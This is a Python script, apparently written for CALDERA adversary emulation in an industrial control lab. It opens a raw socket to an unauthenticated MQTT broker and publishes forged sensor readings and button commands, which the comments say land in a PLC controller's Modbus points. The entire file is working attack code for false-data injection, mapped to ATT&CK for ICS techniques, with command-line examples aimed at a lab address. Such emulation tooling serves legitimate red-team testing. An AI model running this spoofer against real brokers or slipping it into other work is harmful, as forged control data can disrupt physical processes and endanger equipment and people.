#!/usr/bin/env python3
"""mqtt_spoof.py — publish a forged phone-sensor reading to an unauthenticated MQTT broker.

The payload a CALDERA agent runs on the engineer station to emulate the phone-sensor
false-data-injection attack. No dependencies — a raw-socket MQTT 3.1.1 client, so it runs on
any host with python3 (the Sandcat agent assumes nothing). Mirrors the broker the StampLC
controller subscribes to; whatever is published to phone/<id>/<topic> lands in the controller's
network-only phone points (Modbus 140-165).

ATT&CK for ICS: T1692.002 Unauthorized Message: Reporting Message (analog topics; formerly T0856)
/ T1692.001 Unauthorized Message: Command Message (button topics; formerly T0855)
-> T0835 Manipulate I/O Image. CWE-345 / CWE-306.

    python3 mqtt_spoof.py --broker 10.20.30.40:1883 --id ph-abc12 --topic light --message '{"lux":60000}'
    python3 mqtt_spoof.py --broker 10.20.30.40:1883 --topic phone/ph-abc12/btn1 --message '{"v":1}'
"""
import argparse
import json
import socket
import struct
import sys
import time


def _remaining_length(n):
    out = bytearray()
    while True:
        b = n % 128
        n //= 128
        if n > 0:
            b |= 0x80
        out.append(b)
        if n == 0:
            break
    return bytes(out)


def _str(s):
    b = s.encode()
    return struct.pack("!H", len(b)) + b


def connect_packet(client_id):
    vh = _str("MQTT") + bytes([0x04, 0x02]) + struct.pack("!H", 60)   # level 4, clean session, keepalive 60
    payload = _str(client_id)
    body = vh + payload
    return bytes([0x10]) + _remaining_length(len(body)) + body


def publish_packet(topic, message):
    body = _str(topic) + message.encode()                             # QoS 0: no packet id
    return bytes([0x30]) + _remaining_length(len(body)) + body


DISCONNECT = bytes([0xE0, 0x00])


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--broker", default="10.20.30.40:1883", help="host:port of the MQTT broker")
    ap.add_argument("--topic", required=True, help="full topic (phone/<id>/<sensor>) or just <sensor> with --id")
    ap.add_argument("--id", help="phone id; with a bare --topic, publishes to phone/<id>/<topic>")
    ap.add_argument("--message", help="literal JSON payload, e.g. '{\"lux\":60000}'")
    ap.add_argument("--key", help="build the payload as {\"<key>\": <value>} — avoids passing JSON "
                    "through a C2's shell escaping; pair with --value")
    ap.add_argument("--value", help="value for --key; parsed as a number when it looks like one")
    ap.add_argument("--count", type=int, default=1, help="publish this many times")
    ap.add_argument("--interval", type=float, default=1.0, help="seconds between repeats")
    ap.add_argument("--client-id", default="sandcat-spoof", help="MQTT client id (also a claim, not a login)")
    a = ap.parse_args()

    topic = a.topic if "/" in a.topic else f"phone/{a.id}/{a.topic}"
    if "/" not in a.topic and not a.id:
        sys.exit("give a full --topic (phone/<id>/<sensor>) or add --id")

    if a.key is not None:
        try:
            value = json.loads(a.value)            # 60000 -> int, 12.5 -> float, else keep as string
        except (ValueError, TypeError):
            value = a.value
        message = json.dumps({a.key: value})
    elif a.message is not None:
        message = a.message
    else:
        sys.exit("give --message '<json>' or --key <k> --value <v>")
    host, _, port = a.broker.partition(":")
    port = int(port or 1883)

    try:
        s = socket.create_connection((host, port), timeout=5)
    except OSError as e:
        sys.exit(f"could not reach broker {a.broker}: {e}")
    s.sendall(connect_packet(a.client_id))
    ack = s.recv(4)                                                   # CONNACK
    if len(ack) < 4 or ack[0] != 0x20 or ack[3] != 0x00:
        print(f"[mqtt_spoof] CONNACK unexpected: {ack.hex()} (publishing anyway)")
    for i in range(a.count):
        s.sendall(publish_packet(topic, message))
        print(f"[mqtt_spoof] PUBLISH {topic} = {message}  ({i + 1}/{a.count})")
        if i + 1 < a.count:
            time.sleep(a.interval)
    s.sendall(DISCONNECT)
    s.close()
    print(f"[mqtt_spoof] done — {a.count} forged message(s) to {host}:{port}. "
          f"An id is a claim, not a login: the broker accepted it with no authentication.")


if __name__ == "__main__":
    main()
